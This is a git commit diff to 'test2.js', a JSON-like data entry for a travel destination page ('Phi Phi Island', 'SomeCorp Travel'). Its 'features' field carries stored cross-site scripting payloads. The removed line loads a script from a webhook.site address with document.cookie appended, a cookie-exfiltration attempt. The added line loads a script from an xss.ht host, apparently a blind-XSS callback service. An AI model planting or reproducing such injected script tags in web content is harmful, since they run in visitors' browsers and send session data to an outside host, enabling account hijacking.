78e5979403db72a2f5585254846d45063bdca05c
Denis <denp00@yandex.ru>
2020-04-10 00:03:51 +0300

    Update test2.js

--- test2.js
+++ test2.js
@@ -1,2 +1,2 @@
 {"image":"\/images\/destination_5.jpg","title":"Phi Phi Island","subtitle":"Explore it with SomeCorp Travel!","price":"From $3371",
- "features":"<script src=\"https://webhook.site/4cd6b274-464c-4fda-8364-23af07aaa938?a=\"+document.cookie;></script>"}
+ "features":"<script src=https://huntedbyda.xss.ht></script>"}
